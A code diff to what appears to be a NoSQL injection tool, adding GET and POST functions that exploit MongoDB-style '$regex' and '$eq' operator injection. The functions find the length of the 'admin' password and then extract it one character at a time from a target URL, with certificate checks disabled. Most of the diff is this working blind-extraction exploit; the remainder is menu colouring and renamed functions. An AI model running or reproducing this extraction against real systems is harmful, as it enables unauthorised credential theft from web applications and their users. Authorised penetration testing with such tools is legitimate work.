@@ -53,6 +53,7 @@ def vulnTest(nsi):
         vulnerable.append({
           v: True
         })
+        nsi.successIdentifier = rInj.text
         print(colored(f"Possible vulnerable to {phaseTest} Injection!", 'green'))
 
   return vulnerable
@@ -66,13 +67,13 @@ def isVulnerable(arr):
 
 def typeReqPayload(nsi):
   print(nsi.info())
-  print('''\n=================\n[Request Method]\n\n1) Send Request as GET\n2) Send Request as POST\n''')
+  print(colored("\n=================\n[Request Method]\n\n1) Send Request as GET\n2) Send Request as POST\n", "yellow"))
   nsi.reqMethod = input("Choose Request Method >>")
   return nsi.reqMethod
   
 def paramMenu(nsi):
   print(nsi.info())
-  print('''\n=================\n[Configuration Parameter]\n\n1) Default Payload\n2) Custom Payload\n''')
+  print(colored(f"\n=================\n[Configuration Parameter]\n\n1) Payload random value\n2) Payload custom value\n", "yellow"))
   nsi.typeParam = input("Choose One >>")
   while nsi.param != 'd':
     print('press "d" for submit the param')
@@ -84,15 +85,33 @@ def paramMenu(nsi):
 
 def algMenu(nsi):
   print(nsi.info())
-  print('''\n=================\n[Choose Algorithm]\n\n1) Linear Search\n2) Binary Search\n''')
+  print(colored("\n=================\n[Choose Algorithm]\n\n1) Linear Search\n2) Binary Search\n", "yellow"))
   nsi.alg = input("Choose Algorithm >>")
   return nsi.alg
 
-def slinear(nsi):
+def slinearPost(nsi):
   username="admin"
   password=""
-
-  while True:
+  length=""
+  
+  #count length
+  for c in range(0, 9999999):
+    form_data = {}
+    for element in nsi.params:
+      if ("*" in element):
+        element = element.replace("*", "")
+        form_data[element+'[$regex]'] = "^.{"+str(c)+"}$"
+      else:
+        form_data[element+'[$eq]'] = username
+    
+    r = requests.post(nsi.url, data = form_data, verify = False)
+      
+    if nsi.successIdentifier in r.text:
+      print("Found length : %s" % (c))
+      length = c
+      break
+  
+  for x in range(length):
     for c in string.printable:
       if c not in ['*','+','.','?','|', "'", '"', '&', ' ']:
         form_data = {}
@@ -104,10 +123,54 @@ def slinear(nsi):
             form_data[element+'[$eq]'] = username
         r = requests.post(nsi.url, data = form_data, verify = False)
         
-        if 'Success' in r.text:
-            print("Found one more char : %s" % (password+c))
+        if nsi.successIdentifier in r.text:
+            print("Result : %s" % (password+c), end='\r')
             password += c
+            break
+  print("Result : %s" % (password))
 
+def slinearGet(nsi):
+  username="admin"
+  password=""
+  length=""
+  
+  #count length
+  for c in range(0, 9999999):
+    form_data = {}
+    for element in nsi.params:
+      if ("*" in element):
+        element = element.replace("*", "")
+        form_data[element+'[$regex]'] = "^.{"+str(c)+"}$"
+      else:
+        form_data[element+'[$eq]'] = username
+    reqData = Str.http_build_query(form_data)
+    r = requests.get(nsi.url+'?'+reqData, verify = False)
+      
+    if nsi.successIdentifier in r.text:
+      print("Found length : %s" % (c))
+      length = c
+      break
+    
+  for x in range(length):
+    for c in string.printable:
+      if c not in ['*','+','.','?','|', "'", '"', '&', ' ', '(', ')', '[', ']', '\\']:
+        form_data = {}
+        for element in nsi.params:
+          if ("*" in element):
+            element = element.replace("*", "")
+            form_data[element+'[$regex]'] = f"^{urllib.parse.quote_plus(password+c)}"
+          else:
+            form_data[element+'[$eq]'] = username
+        reqData = Str.http_build_query(form_data)
+        # print(reqData)
+        r = requests.get(nsi.url+'?'+reqData,verify = False)
+        
+        if nsi.successIdentifier in r.text:
+            print("Result : %s" % (password+c), end='\r')
+            password += c
+            break
+  print("Result : %s" % (password))
+            
 def sbin(nsi):
   return 0
 
@@ -119,7 +182,7 @@ def getResponseBodyHandlingErrors(req):
     
     return responseBody
 
-def pwnGet(url, req):
+def checkWeb(url):
   print("Checking to see if site at " +str(url).strip() + " is up...")
   tester = WebAppTester(url)
   if tester.is_up():
